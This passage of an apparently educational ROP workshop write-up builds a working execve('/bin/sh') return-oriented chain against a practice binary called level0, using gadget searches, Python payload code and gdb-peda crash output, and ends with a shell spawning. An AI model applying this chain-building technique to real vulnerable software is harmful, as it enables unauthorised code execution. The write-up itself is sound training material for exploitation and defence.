+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0x0
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
+</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
+</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
+</span><span class='line'>EDI: 0x88c01b86
+</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
+</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
+</span><span class='line'>EIP: 0xdeadbeef
+</span><span class='line'>EFLAGS: 0x210246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0xdeadbeef
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
+</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
+</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
+</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
+</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
+</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
+</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
+</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0xdeadbeef in ?? <span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>
+
+<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>
+
+<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p system
+</span><span class='line'>No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>
+
+<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>
+
+<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>
+
+<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>
+
+<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">eax</span> <span class="o">=</span> syscall <span class="nv">number</span> <span class="o">=</span> 0x0b
+</span><span class='line'><span class="nv">ebx</span> <span class="o">=</span> pointer to filename to execute
+</span><span class='line'><span class="nv">ecx</span> <span class="o">=</span> pointer to argv
+</span><span class='line'><span class="nv">edx</span> <span class="o">=</span> pointer to envp
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>
+
+<ol>
+<li>A location to write the string</li>
+<li>A gadget that allows us to write out the string</li>
+</ol>
+
+
+<p>For #1, we can look at the output of vmmap in gdb-peda:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
+</span><span class='line'>Start      End        Perm    Name
+</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
+</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
+</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
+</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
+</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>
+
+<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>
+
+<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search mov <span class="o">[</span>?
+</span><span class='line'>found many, display max <span class="m">256</span> gadgets
+</span><span class='line'>&gt; 0x0806bc2b : mov <span class="o">[</span>ecx<span class="o">]</span>, 0x83<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08071e79 : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08079191 : mov <span class="o">[</span>edx<span class="o">]</span>, eax<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080a82e8 : mov <span class="o">[</span>eax + 0x4c<span class="o">]</span>, edx<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080a6544 : mov <span class="o">[</span>ecx + 0x1fc0<span class="o">]</span>, 4<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08076839 : mov <span class="o">[</span>ecx + 0x83049a74<span class="o">]</span>, cl<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08052fac : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> pop ebp<span class="p">;</span> ret 4
+</span><span class='line'>&gt; 0x080499d2 : mov <span class="o">[</span>ecx<span class="o">]</span>, eax<span class="p">;</span> pop ebp<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080526f6 : mov <span class="o">[</span>ecx<span class="o">]</span>, edx<span class="p">;</span> pop ebp<span class="p">;</span> ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search pop r32
+</span><span class='line'>found <span class="m">15</span> gadgets
+</span><span class='line'>&gt; 0x0806b893 : pop eax<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080525ee : pop ebx<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080525c6 : pop edx<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x0806a5c9 : pop esi<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080516ad : pop edi<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08048550 : pop ebp<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x08064630 : pop esp<span class="p">;</span> ret
+</span><span class='line'>&gt; 0x080525ed : pop ecx<span class="p">;</span> pop ebx<span class="p">;</span> ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'><span class="c"># start our payload as a string of character.</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># start writing here</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/bin&#39;</span>            <span class="c"># first part of /bin/sh</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca044</span><span class="p">)</span>   <span class="c"># just after the first piece of &#39;/bin&#39;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/shX&#39;</span>            <span class="c"># we&#39;ll zero out the X in a moment</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08097bff</span><span class="p">)</span>   <span class="c"># xor eax, eax; ret (set eax to 0)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca047</span><span class="p">)</span>   <span class="c"># zero out the X, making the string NULL terminated</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>          <span class="c"># crash</span>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run it and expect the memory area:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">python</span> <span class="n">purepoc0</span><span class="o">.</span><span class="n">py</span> <span class="o">&gt;</span> <span class="n">input0</span>
+</span><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">level0</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">seb</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">level0</span><span class="o">...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">input0</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">ROP</span> <span class="n">tutorial</span> <span class="n">level0</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">What</span><span class="s">&#39;s your name? [+] Bet you can&#39;</span><span class="n">t</span> <span class="n">ROP</span> <span class="n">me</span><span class="p">,</span> <span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK</span><span class="err">�@�</span>
+</span><span class='line'>              <span class="err">��</span><span class="o">/</span><span class="nb">bin</span><span class="err">��</span><span class="n">D</span><span class="err">�</span>
+</span><span class='line'>                       <span class="err">��</span><span class="o">/</span><span class="n">shX</span><span class="err">��</span><span class="p">{</span>       <span class="err">�</span><span class="n">G</span><span class="err">�</span>
+</span><span class='line'>                                         <span class="err">�</span><span class="n">AAAA</span><span class="err">!</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+</span><span class='line'><span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
+</span><span class='line'><span class="n">EAX</span><span class="p">:</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="n">EBX</span><span class="p">:</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="n">ECX</span><span class="p">:</span> <span class="mh">0xbffff5cc</span> <span class="o">--&gt;</span> <span class="mh">0x80ca720</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2a84</span>
+</span><span class='line'><span class="n">EDX</span><span class="p">:</span> <span class="mh">0x80ca047</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="n">ESI</span><span class="p">:</span> <span class="mh">0x80488e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_fini</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span><span class="p">)</span>
+</span><span class='line'><span class="n">EDI</span><span class="p">:</span> <span class="mh">0x6f23fbda</span>
+</span><span class='line'><span class="n">EBP</span><span class="p">:</span> <span class="mh">0x4b4b4b4b</span> <span class="p">(</span><span class="s">&#39;KKKK&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">ESP</span><span class="p">:</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="n">EIP</span><span class="p">:</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="s">&#39;AAAA&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">EFLAGS</span><span class="p">:</span> <span class="mh">0x210246</span> <span class="p">(</span><span class="n">carry</span> <span class="n">PARITY</span> <span class="n">adjust</span> <span class="n">ZERO</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
+</span><span class='line'><span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
+</span><span class='line'><span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x41414141</span>
+</span><span class='line'><span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
+</span><span class='line'><span class="mo">0000</span><span class="o">|</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">0004</span><span class="o">|</span> <span class="mh">0xbffff65c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff660</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">0012</span><span class="o">|</span> <span class="mh">0xbffff664</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">0016</span><span class="o">|</span> <span class="mh">0xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">0020</span><span class="o">|</span> <span class="mh">0xbffff66c</span> <span class="o">--&gt;</span> <span class="mh">0x6f23fbda</span>
+</span><span class='line'><span class="mo">0024</span><span class="o">|</span> <span class="mh">0xbffff670</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff674</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
+</span><span class='line'><span class="n">Legend</span><span class="p">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
+</span><span class='line'><span class="n">Stopped</span> <span class="n">reason</span><span class="p">:</span> <span class="n">SIGSEGV</span>
+</span><span class='line'><span class="mh">0x41414141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80ca040</span>
+</span><span class='line'><span class="mh">0x80ca040</span><span class="p">:</span>  <span class="s">&quot;/bin/sh&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>
+
+<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># building from the previous code</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525ed</span><span class="p">)</span>   <span class="c"># pop ecx; pop ebx; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># ecx -&gt; will be zeroed later</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># ebx, filename to execute &quot;/bin/sh&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08083f36</span><span class="p">)</span>   <span class="c"># inc ecx; adc al, 0x39; ret</span>
+</span><span class='line'>                          <span class="c"># this will clobber eax, but we&#39;ll set it later anyway. ecx will be zero</span>
+</span><span class='line'>  
+</span><span class='line'><span class="c"># do the same for edx                     </span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># </span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804ef21</span><span class="p">)</span>   <span class="c"># inc edx; add al, 0x83; ret</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># continue</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4141410b</span><span class="p">)</span>   <span class="c"># value for eax, without NULL bytes</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08071b90</span><span class="p">)</span>   <span class="c"># movzx eax, al; ret</span>
+</span><span class='line'>                          <span class="c"># after this instruction, eax will be 0x0b</span>
+</span><span class='line'>                          
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08052cf0</span><span class="p">)</span>   <span class="c"># int 0x80; ret</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s it. Let&rsquo;s try:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python purepoc0.py &gt; input0
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q level0
+</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...
+</span><span class='line'>
+</span><span class='line'>process <span class="m">3481</span> is executing new program: /bin/dash
+</span><span class='line'><span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 3481<span class="o">)</span> exited normally<span class="o">]</span>
+</span><span class='line'>Warning: not running or target is remote
+</span><span class='line'>gdb-peda<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
